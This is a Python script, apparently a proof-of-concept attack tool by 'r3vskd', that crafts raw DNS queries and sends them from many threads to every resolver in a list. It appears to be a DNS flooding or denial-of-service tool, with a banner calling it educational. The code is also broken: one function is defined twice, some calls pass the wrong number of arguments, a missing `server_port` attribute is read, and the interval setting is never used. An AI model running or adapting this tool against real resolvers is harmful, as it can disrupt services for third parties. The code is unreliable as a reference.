import socket
import threading
import time
import argparse

def get_resolvers_from_file(file_path):
    with open(file_path, 'r') as file:
        resolvers = [line.strip() for line in file.readlines()]
    return resolvers

def send_queries_through_resolvers(domain, resolvers, server_port, num_queries, interval, verbose):
    for resolver in resolvers:
        send_dns_query(domain, resolver, server_port, num_queries, interval, verbose)

def get_address_port():
    address = input("Enter server address: ")
    port = int(input("Enter server port: "))
    return address, port

def send_dns_query(domain_name, dns_server_address, dns_server_port, interval, verbose):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = (dns_server_address, dns_server_port)

    try:
        identifier = 0x1337.to_bytes(2, byteorder='big')
        flags = (0).to_bytes(2, byteorder='big')
        qdcount = (1).to_bytes(2, byteorder='big')
        qtype = (1).to_bytes(2, byteorder='big')
        qclass = (1).to_bytes(2, byteorder='big')

        labels = domain_name.split('.')
        qname = b''.join(len(label).to_bytes(1, byteorder='big') + label.encode() for label in labels) + b'\x00'

        dns_query = identifier + flags + qdcount + (b'\x00\x00\x00\x00\x00\x00') + qname + qtype + qclass

        if verbose:
            print(f"Sending DNS query for {domain_name} to {dns_server_address}:{dns_server_port}")

        client_socket.sendto(dns_query, server_address)

        data, _ = client_socket.recvfrom(1024)

        if verbose:
            print(f"Received DNS Response for {domain_name}:\n", data.hex())

    finally:
        client_socket.close()

def send_queries_through_resolvers(domain, resolvers, server_port, num_queries, interval, verbose):
    threads = []
    for resolver in resolvers:
        for _ in range(num_queries):
            thread = threading.Thread(target=send_dns_query, args=(domain, resolver, server_port, interval, verbose))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

def display_banner():
    print('''
█▀▄▀█ ▄███▄     ▄▄▄▄▀ ▄███▄   ████▄ █▄▄▄▄ ██   ▄█    ▄   
█ █ █ █▀   ▀ ▀▀▀ █    █▀   ▀  █   █ █  ▄▀ █ █  ██     █  
█ ▄ █ ██▄▄       █    ██▄▄    █   █ █▀▀▌  █▄▄█ ██ ██   █ 
█   █ █▄   ▄▀   █     █▄   ▄▀ ▀████ █  █  █  █ ▐█ █ █  █ 
   █  ▀███▀    ▀      ▀███▀           █      █  ▐ █  █ █ 
  ▀                                  ▀      █     █   ██ 
                                           ▀  Author: r3vskd
                                              Warning: It was created for educational purposes. Please don't misuse it for illegal activities.         
''')
    print("Usage:")
    print(" $python ./poc2.py -f resolvers.txt -d domain.com -s xxx.xxx.xxx.xxx -p 80 -q 4 -i 1\n")
    print("Options:")
    print("  -f or --file             DNS Resolvers txt file")
    print("  -d or --domain           Set the domain name to query")
    print("  -s or --server_address   Set the dns server address")
    print("  -p or --port             Set the server port")
    print("  -q or --num_queries      Set the number of queries to send (Default: 1)")
    print("  -i or --interval         Set the interval between queries in seconds (Default: 1 second)")
    print("  -v or --verbose          Enable verbose mode (optional)\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='DNS query sender')
    parser.add_argument('-d', '--domain', type=str, help='Domain name to query')
    parser.add_argument('-f', '--file', type=str, help='Path to the file containging DNS resolver addresses')
    parser.add_argument('-s', '--server_address', type=str, help='DNS server address')
    parser.add_argument('-p', '--port', type=int, help='DNS server port')
    parser.add_argument('-q', '--num_queries', nargs='?', const=1, type=int, help='Number of queries to send')
    parser.add_argument('-i', '--interval', nargs='?', const=1.0, type=float, help='Interval between queries in seconds')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')

    args = parser.parse_args()

    if not any(vars(args).values()):
        display_banner()
    elif args.file and args.port and args.domain and args.server_address and args.num_queries and args.interval:
        resolvers=get_resolvers_from_file(args.file)
        send_queries_through_resolvers(args.domain, resolvers, args.port, args.num_queries, args.interval, args.verbose)
        send_dns_query(args.domain, args.server_address, args.server_port, args.num_queries, args.interval, args.verbose)
    else:
         print("Please provide a file containing DNS resolver addresses using -f/--file, specify the DNS server port using -p/--port, the domain using -d/--domain, and the server address using -s/--server_address.")
